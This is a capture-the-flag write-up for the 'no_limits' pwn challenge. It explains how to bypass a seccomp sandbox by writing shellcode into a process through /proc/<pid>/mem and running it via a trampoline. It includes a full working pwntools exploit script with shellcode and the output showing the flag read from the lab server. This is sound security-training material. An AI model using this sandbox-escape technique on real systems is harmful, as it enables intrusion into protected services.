---
title: Huntress_No_limits
published: true
---



# no_limits

#pwn #shellcode



![](assets/no_limits.png)


This challenge presents a **sandboxed Linux binary** that allows dynamic memory allocation and execution of user-supplied shellcode. A **seccomp** filter is used to restrict certain syscalls, and Address Space Layout Randomization (ASLR) is enabled. The goal is to **read and print the contents of `/flag.txt`** without traditional command execution.


The binary presents a menu with 4 options:
1) Create Memory
2) Get Debug Informationn
3) Execute Code
4) Exit

Option 1 allocates memory via `mmap()` with user-defined size and permissions.  
Option 2 prints the child PID.  
Option 3 takes an address and executes it as code after enabling seccomp restrictions.  
Option 4 exits.


---


## ⚙️ Restrictions & Observations

- ✅ Memory is user-allocated using `mmap()` with chosen size and permissions (up to RWX).    
- ✅ We can write arbitrary shellcode.    
- ✅ The code execution is controlled.    
- ❌ No `execve()` or shell syscalls allowed due to `seccomp`.    
- ✅ `read`, `write`, `open`, and `exit` syscalls are allowed.    
- ✅ The child process PID is printed — this is key to the solution.    
- ✅ `/proc/<pid>/mem` is accessible before `seccomp` is applied.


The exploit targets a binary that provides memory allocation with RWX permissions and allows code execution at an arbitrary address. The idea is to:

1. **Inject a custom shellcode** into the program's memory space    
2. **Abuse the `/proc/[pid]/mem` interface** to write additional shellcode into another region of the process's memory (bypassing input limits)    
3. Execute that remote code using a trampoline technique    
4. Extract the contents of `/flag.txt`.


![[Pasted image 20251104174944.png]]

### POC


```py
#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'

# Check if the user provided an IP and port
# len(sys.argv) should be 3: [script_name, ip, port]
if len(sys.argv) == 3:
    ip = sys.argv[1]
    # The port from sys.argv is a string, so it must be converted to an integer
    port = int(sys.argv[2])
    log.info(f"Connecting to {ip}:{port}")
    p = remote(ip, port)  
else:
    log.info("No IP/port provided, running local process './no_limits'")
    p = process('./no_limits')

p.sendlineafter(b'4) Exit\n', b'2')
p.recvline()

# The second line contains the PID. Receive it into a variable.
pid_line = p.recvline()

# The line is a byte string like b'Child PID = 28\n'.
# We need to decode it to a regular string, split it by spaces,
# take the last part, and convert it to an integer.
pid = int(pid_line.decode().split(' ')[-1].strip())

# Now you can use the extracted PID
print(f"Successfully extracted PID: {pid}")

def payload(pid, tgt=0x4040A8, tramp=0x4012B0):
    return asm(f'''
    .intel_syntax noprefix
    _start:
        call $+5
        pop rbx

        lea r12, trampoline[rip]
        lea r13, trampoline_end[rip]
        sub r13, r12

        lea rdi, path[rip]
        mov rsi, 1
        xor rdx, rdx
        mov rax, 2
        syscall
        mov rdi, rax

        mov rax, 8
        mov rsi, {tramp}
        xor rdx, rdx
        syscall

        mov rax, 1
        mov rsi, r12
        mov rdx, r13
        syscall

        mov rax, 8
        mov rsi, {tgt}
        xor rdx, rdx
        syscall

        mov rax, 1
        lea rsi, text[rip]
        mov rdx, 8
        syscall

    loop: jmp loop

    trampoline:
        lea rdi, flag[rip]
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        mov r12, rax

        sub rsp, 0x300
        mov rdi, r12
        mov rsi, rsp
        mov rdx, 0x200
        xor rax, rax
        syscall
        mov r13, rax

        xor r15, r15
    w:  mov rax, 1
        mov rdi, r15
        mov rsi, rsp
        mov rdx, r13
        syscall
        inc r15
        cmp r15, 16
        jne w

        add rsp, 0x300
        mov rax, 60
        xor rdi, rdi
        syscall

    path:   .asciz "/proc/{pid}/mem"
    text:   .quad {tramp}
    flag:   .asciz "/flag.txt"
    trampoline_end:
    ''')


p.sendlineafter(b'4) Exit\n', b'1')
p.sendlineafter(b'memory to be?\n', b'4096')
p.sendlineafter(b'for the memory?\n', b'7')
p.sendlineafter(b'want to include?\n', payload(pid))

p.recvuntil(b'Wrote your buffer at ')
shellcode_addr = int(p.recvline().strip(), 16)
log.success(f"Shellcode at: {hex(shellcode_addr)}")

p.sendlineafter(b'4) Exit\n', b'3')
p.sendlineafter(b'execute code?\n', hex(shellcode_addr).encode())

# Receive everything
try:
    # Assuming 'output' contains b'flag{...}\nflag{...}\n'
    output = p.recvall(timeout=5)
    
    # Decode the byte string into a regular string
    text_output = output.decode()
    
    # Split the string by newlines to get a list of flags
    flags = text_output.strip().split('\n')
    
    # Get the first unique flag
    if flags:
        log.success(f"Flag: {flags[0]}")
except Exception as e:
    log.error(f"No output captured: {e}")

p.close()
```

And here is the flag

```bash
[*] Connecting to 10.1.56.240:9999 
[+] Opening connection to 10.1.56.240 on port 9999: Done Successfully extracted PID: 27 
[+] Shellcode at: 0x77a98641e000 
[+] Receiving all data: Done (78B) 
[*] Closed connection to 10.1.56.240 port 9999 

[+] Flag: flag{6f6c733424f20f22303fd47aeb991425}
```

![](assets/gandalf.gif)